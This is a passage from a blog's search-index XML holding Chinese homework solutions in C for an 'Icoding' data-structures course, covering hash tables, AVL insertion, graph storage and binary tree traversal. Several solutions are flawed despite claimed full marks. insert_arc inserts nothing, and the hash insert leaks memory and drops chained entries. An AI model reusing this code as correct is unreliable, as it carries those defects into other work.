key, int value, long keyhash)</span><br><span class="line">&#123;</span><br><span class="line">    HashEntry* Head &#x3D; table-&gt;bucket[keyhash];</span><br><span class="line"></span><br><span class="line">    while (Head &amp;&amp; strcmp(Head-&gt;key.str_value, key)) &#123;</span><br><span class="line">        Head &#x3D; Head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!Head)</span><br><span class="line">        return -1;</span><br><span class="line">    else if (Head-&gt;value.int_value &#x3D;&#x3D; value)</span><br><span class="line">        return 1;</span><br><span class="line">    else &#123;</span><br><span class="line">        Head-&gt;value.int_value &#x3D; value;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HASH_RESULT hash_add_int(HashTable* table, const char* key, int value)</span><br><span class="line">&#123;</span><br><span class="line">    int p;</span><br><span class="line">    long keyhash &#x3D; hash_string(key) % table-&gt;size;</span><br><span class="line">    p &#x3D; Find(table, key, value, keyhash);</span><br><span class="line"></span><br><span class="line">    if (p &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        HashEntry* Node &#x3D; (HashEntry*)malloc(sizeof(HashEntry));</span><br><span class="line">        if (!Node)</span><br><span class="line">            return HASH_ERROR;</span><br><span class="line">        Node-&gt;key.str_value &#x3D; (char*)malloc(100);</span><br><span class="line">        if (Node-&gt;key.str_value &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">            return HASH_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line">        Node-&gt;key.str_value &#x3D; (char*)key;</span><br><span class="line">        Node-&gt;value.int_value &#x3D; value;</span><br><span class="line">        &#x2F;&#x2F;Node-&gt;next &#x3D; table-&gt;bucket[keyhash]; &#x2F;&#x2F;？</span><br><span class="line">        table-&gt;bucket[keyhash] &#x3D; Node;</span><br><span class="line">        return HASH_ADDED;</span><br><span class="line">    &#125; else if (p &#x3D;&#x3D; 0)</span><br><span class="line">        return HASH_REPLACED_VALUE;</span><br><span class="line">    else</span><br><span class="line">        return HASH_ALREADY_ADDED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h1><p>AVL添加</p><p>平衡二叉树，是一种二叉排序树，其中每个结点的左子树和右子树的高度差至多等于1。它是一种高度平衡的二叉排序树。现二叉平衡树结点定义如下：</p><blockquote><p>typedef struct node<br>{<br>    int val;<br>    struct node *left;<br>    struct node *right;<br>    struct node *parent;<br>    int height;<br>} node_t;</p></blockquote><p>请实现平衡二叉树的插入算法：</p><blockquote><p>//向根为 root 的平衡二叉树插入新元素 val，成功后返回新平衡二叉树根结点<br>node_t *avl_insert(node_t *root, int val);</p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-06-22, Mon, 02:12:15</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;avl.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">node_t* Insert(node_t* T, int X);</span><br><span class="line">int GetHeight(node_t* T);</span><br><span class="line">int Max(int a, int b);</span><br><span class="line">node_t* SingleLeftRotation(node_t* A);</span><br><span class="line">node_t* DoubleLeftRightRotation(node_t* A);</span><br><span class="line">node_t* SingleRightRotation(node_t* A);</span><br><span class="line">node_t* DoubleRightLeftRotation(node_t* A);</span><br><span class="line"></span><br><span class="line">int Max(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line">    return a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int GetHeight(node_t* T)</span><br><span class="line">&#123;</span><br><span class="line">    if (T)</span><br><span class="line">        return T-&gt;height;</span><br><span class="line">    else</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node_t* SingleLeftRotation(node_t* A)</span><br><span class="line">&#123;</span><br><span class="line">    node_t* B;</span><br><span class="line">    B &#x3D; A-&gt;left;</span><br><span class="line">    A-&gt;left &#x3D; B-&gt;right;</span><br><span class="line">    B-&gt;right &#x3D; A;</span><br><span class="line">    A-&gt;height &#x3D; Max(GetHeight(A-&gt;left), GetHeight(A-&gt;right)) + 1;</span><br><span class="line">    B-&gt;height &#x3D; Max(GetHeight(B-&gt;left), GetHeight(B-&gt;right)) + 1;</span><br><span class="line">    return B;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node_t* DoubleLeftRightRotation(node_t* A)</span><br><span class="line">&#123;</span><br><span class="line">    A-&gt;left &#x3D; SingleRightRotation(A-&gt;left);</span><br><span class="line">    return SingleLeftRotation(A);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node_t* SingleRightRotation(node_t* A)</span><br><span class="line">&#123;</span><br><span class="line">    node_t* B;</span><br><span class="line">    B &#x3D; A-&gt;right;</span><br><span class="line">    A-&gt;right &#x3D; B-&gt;left;</span><br><span class="line">    B-&gt;left &#x3D; A;</span><br><span class="line">    A-&gt;height &#x3D; Max(GetHeight(A-&gt;left), GetHeight(A-&gt;right)) + 1;</span><br><span class="line">    B-&gt;height &#x3D; Max(GetHeight(B-&gt;left), GetHeight(B-&gt;right)) + 1;</span><br><span class="line">    return B;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node_t* DoubleRightLeftRotation(node_t* A)</span><br><span class="line">&#123;</span><br><span class="line">    A-&gt;right &#x3D; SingleLeftRotation(A-&gt;right);</span><br><span class="line">    return SingleRightRotation(A);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node_t* avl_insert(node_t* root, int val)</span><br><span class="line">&#123;</span><br><span class="line">    node_t* parentNode &#x3D; NULL;</span><br><span class="line">    if (!root) &#123;</span><br><span class="line">        root &#x3D; (node_t*)malloc(sizeof(node_t));</span><br><span class="line">        root-&gt;left &#x3D; root-&gt;right &#x3D; root-&gt;parent &#x3D; NULL;</span><br><span class="line">        root-&gt;val &#x3D; val;</span><br><span class="line">        root-&gt;height &#x3D; 1;</span><br><span class="line">    &#125; else if (val &lt; root-&gt;val) &#123;</span><br><span class="line">        parentNode &#x3D; root-&gt;left;</span><br><span class="line">        root-&gt;left &#x3D; avl_insert(root-&gt;left, val);</span><br><span class="line">        if (GetHeight(root-&gt;left) - GetHeight(root-&gt;right) &#x3D;&#x3D; 2) &#123;</span><br><span class="line">            if (val &lt; root-&gt;left-&gt;val)</span><br><span class="line">                root &#x3D; SingleLeftRotation(root);</span><br><span class="line">            else &#123;</span><br><span class="line">                root &#x3D; DoubleLeftRightRotation(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (val &gt; root-&gt;val) &#123;</span><br><span class="line">        parentNode &#x3D; root-&gt;left;</span><br><span class="line">        root-&gt;right &#x3D; avl_insert(root-&gt;right, val);</span><br><span class="line">        if (GetHeight(root-&gt;right) - GetHeight(root-&gt;left) &#x3D;&#x3D; 2) &#123;</span><br><span class="line">            if (val &gt; root-&gt;right-&gt;val)</span><br><span class="line">                root &#x3D; SingleRightRotation(root);</span><br><span class="line">            else</span><br><span class="line">                root &#x3D; DoubleRightLeftRotation(root);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    root-&gt;parent &#x3D; parentNode;</span><br><span class="line">    root-&gt;height &#x3D; Max(GetHeight(root-&gt;left), GetHeight(root-&gt;right)) + 1;</span><br><span class="line">    return root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Icoding </tag>
            
            <tag> 作业 </tag>
            
            <tag> 查找 </tag>
            
            <tag> 哈希表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Icoding平台第六次作业解析-图的储存</title>
      <link href="/post/2a6df9f7.html"/>
      <url>/post/2a6df9f7.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h1><p>邻接矩阵<br>试在邻接矩阵存储结构上实现图的基本操作 matrix_insert_vertex 和matrix_insert_arc，相关定义如下：</p><blockquote><p>typedef int VertexType;</p><p>typedef enum{<br>    DG, UDG<br>}GraphType;</p><p>typedef struct{<br>    VertexType vertex[MAX_VERTEX_NUM]; //顶点向量<br>    int arcs[MAX_VERTEX_NUM][MAX_VERTEX_NUM]; //邻接矩阵<br>    int vexnum, arcnum;   //图的当前顶点数和弧数<br>    GraphType type;     //图的种类标志<br>}MatrixGraph;</p><p>int matrix_locate_vertex(MatrixGraph MG, VertexType vex); //返回顶点 v 在vertex数组中的下标，如果v不存在，返回-1<br>bool matrix_insert_vertex(MatrixGraph G, VertexType v);<br>bool matrix_insert_arc(MatrixGraph *G, VertexType v, VertexType w);</p></blockquote><p>当成功插入顶点或边时，函数返回true，否则（如顶点或边已存在、插入边时顶点v或w不存在）返回false。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-06-10, Wed, 13:06:59</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;graph.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">bool matrix_insert_vertex(MatrixGraph* G, VertexType v)</span><br><span class="line">&#123;</span><br><span class="line">    if (matrix_locate_vertex(G, v) !&#x3D; -1 || G-&gt;vexnum + 1 &gt;&#x3D; MAX_VERTEX_NUM)</span><br><span class="line">        return false;</span><br><span class="line">    G-&gt;vertex[G-&gt;vexnum] &#x3D; v;</span><br><span class="line">    G-&gt;vexnum++;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; G-&gt;vexnum; i++)</span><br><span class="line">        G-&gt;arcs[i][G-&gt;vexnum - 1] &#x3D; G-&gt;arcs[G-&gt;vexnum - 1][i] &#x3D; 0;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool matrix_insert_arc(MatrixGraph* G, VertexType v, VertexType w)</span><br><span class="line">&#123;</span><br><span class="line">    int i &#x3D; matrix_locate_vertex(G, v), j &#x3D; matrix_locate_vertex(G, w);</span><br><span class="line">    if (i &#x3D;&#x3D; -1 || j &#x3D;&#x3D; -1)</span><br><span class="line">        return false;</span><br><span class="line">    else if (G-&gt;arcs[i][j] &#x3D;&#x3D; 1)</span><br><span class="line">        return false;</span><br><span class="line">    else &#123;</span><br><span class="line">        G-&gt;arcs[i][j] &#x3D; 1;</span><br><span class="line">        G-&gt;arcs[j][i] &#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">    G-&gt;arcnum +&#x3D; 1;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h1><p>邻接表1<br>试在邻接表存储结构上实现图的基本操作 insert_vertex 和 insert_arc，相关定义如下：</p><blockquote><p>typedef int VertexType;</p><p>typedef enum{<br>    DG, UDG<br>}GraphType;</p><p>typedef struct ArcNode<br>{<br>    int adjvex;<br>    InfoPtr *info;<br>    struct ArcNode *nextarc;</p><p>}ArcNode;</p><p>typedef struct VNode<br>{<br>    VertexType data;<br>    ArcNode *firstarc;<br>}VNode;<br>typedef struct<br>{<br>    VNode vertex[MAX_VERTEX_NUM];<br>    int vexnum, arcnum;<br>    GraphType type;<br>}ListGraph;</p><p>int locate_vertex(ListGraph* G, VertexType v); //返回顶点 v 在vertex数组中的下标，如果v不存在，返回-1<br>bool insert_vertex(ListGraph <em>G, VertexType v);<br>bool insert_arc(ListGraph *G, VertexType v, VertexType w);<br>bool is_empty(Stack</em> S);  // 栈为空时返回 true，否则返回 false</p></blockquote><p>当成功插入顶点或边时，函数返回true，否则（如顶点或边已存在、插入边时顶点v或w不存在）返回false。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-06-12, Thu, 16:07:33</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;graph.h&quot; &#x2F;&#x2F;请勿删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">bool insert_vertex(ListGraph* G, VertexType v)</span><br><span class="line">&#123;</span><br><span class="line">    if (locate_vertex(G, v) !&#x3D; -1 || G-&gt;vexnum + 1 &gt;&#x3D; MAX_VERTEX_NUM)</span><br><span class="line">        return false;</span><br><span class="line">    G-&gt;vertex[G-&gt;vexnum].data &#x3D; v;</span><br><span class="line">    G-&gt;vertex[G-&gt;vexnum].firstarc &#x3D; NULL;</span><br><span class="line">    G-&gt;vexnum++;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool insert_arc(ListGraph* G, VertexType v, VertexType w)</span><br><span class="line">&#123;</span><br><span class="line">    if (locate_vertex(G, v) &#x3D;&#x3D; -1 || locate_vertex(G, w) &#x3D;&#x3D; -1)</span><br><span class="line">        return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h1><p>邻接表2<br>试在邻接表存储结构上实现图的基本操作 del_vertex，相关定义如下：</p><blockquote><p>typedef int VertexType;</p><p>typedef enum{<br>    DG, UDG<br>}GraphType;</p><p>typedef struct ArcNode{<br>    int adjvex;<br>    InfoPtr info;<br>    struct ArcNode nextarc;<br>}ArcNode;</p><p>typedef struct VNode{<br>    VertexType data;<br>    ArcNode firstarc;<br>}VNode;<br>typedef struct{<br>    VNode vertex[MAX_VERTEX_NUM];<br>    int vexnum, arcnum;<br>    GraphType type;<br>}ListGraph;</p><p>int locate_vertex(ListGraph *G, VertexType v); //返回顶点 v 在vertex数组中的下标，如果v不存在，返回-1<br>bool del_vertex(ListGraph *G, VertexType v); //删除顶点 v</p></blockquote><p>当成功删除顶点或边时，函数返回true，否则（如顶点或边不存在、删除边时顶点v或w不存在）返回false。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-06-13, Sat, 11:09:26</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;graph.h&quot; &#x2F;&#x2F;请勿删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">bool del_vertex(ListGraph* G, VertexType v)</span><br><span class="line">&#123;</span><br><span class="line">    int t &#x3D; locate_vertex(G, v), i;</span><br><span class="line">    if (t &lt; 0)</span><br><span class="line">        return false;</span><br><span class="line">    ArcNode *q, *p;</span><br><span class="line">    p &#x3D; G-&gt;vertex[t].firstarc;</span><br><span class="line">    while (p) &#123;</span><br><span class="line">        q &#x3D; p;</span><br><span class="line">        p &#x3D; p-&gt;nextarc;</span><br><span class="line">        free(q);</span><br><span class="line">        G-&gt;arcnum--;</span><br><span class="line">    &#125;</span><br><span class="line">    G-&gt;vertex[t].firstarc &#x3D; NULL;</span><br><span class="line">    for (i &#x3D; 0; i &lt; G-&gt;vexnum; i++) &#123;</span><br><span class="line">        p &#x3D; G-&gt;vertex[i].firstarc;</span><br><span class="line">        while (p &amp;&amp; p-&gt;adjvex !&#x3D; t) &#123;</span><br><span class="line">            q &#x3D; p;</span><br><span class="line">            p &#x3D; p-&gt;nextarc;</span><br><span class="line">        &#125;</span><br><span class="line">        if (p &amp;&amp; p-&gt;adjvex &#x3D;&#x3D; t) &#123;</span><br><span class="line">            if (p &#x3D;&#x3D; G-&gt;vertex[i].firstarc) &#123;</span><br><span class="line">                G-&gt;vertex[i].firstarc &#x3D; p-&gt;nextarc;</span><br><span class="line">                free(p);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                q-&gt;nextarc &#x3D; p-&gt;nextarc;</span><br><span class="line">                free(p);</span><br><span class="line">            &#125;</span><br><span class="line">            G-&gt;arcnum--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for (i &#x3D; t + 1; i &lt; G-&gt;vexnum; i++) &#123;</span><br><span class="line">        G-&gt;vertex[i - 1] &#x3D; G-&gt;vertex[i];</span><br><span class="line">    &#125;</span><br><span class="line">    G-&gt;vexnum--;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Icoding </tag>
            
            <tag> 作业 </tag>
            
            <tag> 图 </tag>
            
            <tag> 储存 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Icoding平台第五次作业解析-树二叉树</title>
      <link href="/post/baa44d8a.html"/>
      <url>/post/baa44d8a.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h1><p>先序遍历<br>已知二叉树按照二叉链表方式存储，利用栈的基本操作写出先序遍历非递归形式的算法：</p><blockquote><p>void pre_order(BiTree root);</p></blockquote><p>在遍历过程中，pre_order函数需要调用 visit_node 函数来实现对结点的访问，该函数声明如下：</p><blockquote><p>void visit_node(BiTNode *node);</p></blockquote><p>二叉树的相关定义如下：</p><blockquote><p>typedef int DataType;</p><p>typedef struct Node{<br>    DataType data;<br>    struct Node* left;<br>    struct Node* right;<br>}BiTNode, *BiTree;</p></blockquote><p>遍历所使用栈的相关操作如下：</p><blockquote><p>#define Stack_Size 50<br>typedef BiTNode* ElemType;<br>typedef struct{<br>    ElemType elem[Stack_Size];<br>    int top;<br>}Stack;</p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-05-10, Sun, 17:50:25</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;bitree.h&quot; &#x2F;&#x2F;请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void pre_order(BiTree root)</span><br><span class="line">&#123;</span><br><span class="line">    BiTNode* p;</span><br><span class="line">    Stack s;</span><br><span class="line">    p &#x3D; root;</span><br><span class="line">    init_stack(&amp;s);</span><br><span class="line">    while (p || !is_empty(&amp;s)) &#123;</span><br><span class="line">        if (p !&#x3D; NULL) &#123;</span><br><span class="line">            visit_node(p);</span><br><span class="line">            push(&amp;s, p);</span><br><span class="line">            p &#x3D; p-&gt;left;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            pop(&amp;s, &amp;p);</span><br><span class="line">            p &#x3D; p-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h1><p>路径<br>假设二叉树采用二叉链表方式存储， root指向根结点，node 指向二叉树中的一个结点，编写函数 path，计算root到 node 之间的路径，（该路径包括root结点和 node 结点）。path 函数声明如下：</p><blockquote><p>bool path(BiTNode* root, BiTNode* node, Stack* s);</p></blockquote><p>其中，root指向二叉树的根结点，node指向二叉树中的另一结点，s 为已经初始化好的栈，该栈用来保存函数所计算的路径，如正确找出路径，则函数返回 true，此时root在栈底，node在栈顶；如未找到，则函数返回 false, 二叉树的相关定义如下：</p><blockquote><p>typedef int DataType;</p><p>typedef struct Node{<br>    DataType data;<br>    struct Node* left;<br>    struct Node* right;<br>}BiTNode, *BiTree;</p></blockquote><p>栈的相关定义及操作如下：</p><blockquote><p>#define Stack_Size 50<br>typedef BiTNode* ElemType;<br>typedef struct{<br>    ElemType elem[Stack_Size];<br>    int top;<br>}Stack;</p><p>void init_stack(Stack <em>S); // 初始化栈<br>bool push(Stack</em> S, ElemType x); //x 入栈<br>bool pop(Stack* S, ElemType <em>px); //出栈，元素保存到px所指的单元，函数返回true,栈为空时返回 false<br>bool top(Stack</em> S, ElemType <em>px); //获取栈顶元素，将其保存到px所指的单元，函数返回true，栈满时返回 false<br>bool is_empty(Stack</em> S);  // 栈为空时返回 true，否则返回 false</p></blockquote><p>在提示中，树用缩进的形式展示，如二叉树【pic】，其缩进形式为：【pic】</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-05-10, Sun, 18:00:41</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;bitree.h&quot; &#x2F;&#x2F;请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">bool path(BiTNode* root, BiTNode* node, Stack* s)</span><br><span class="line">&#123;</span><br><span class="line">    BiTree Tr &#x3D; root, p &#x3D; NULL;</span><br><span class="line">    if (Tr &#x3D;&#x3D; NULL || node &#x3D;&#x3D; NULL || !is_empty(s))</span><br><span class="line">      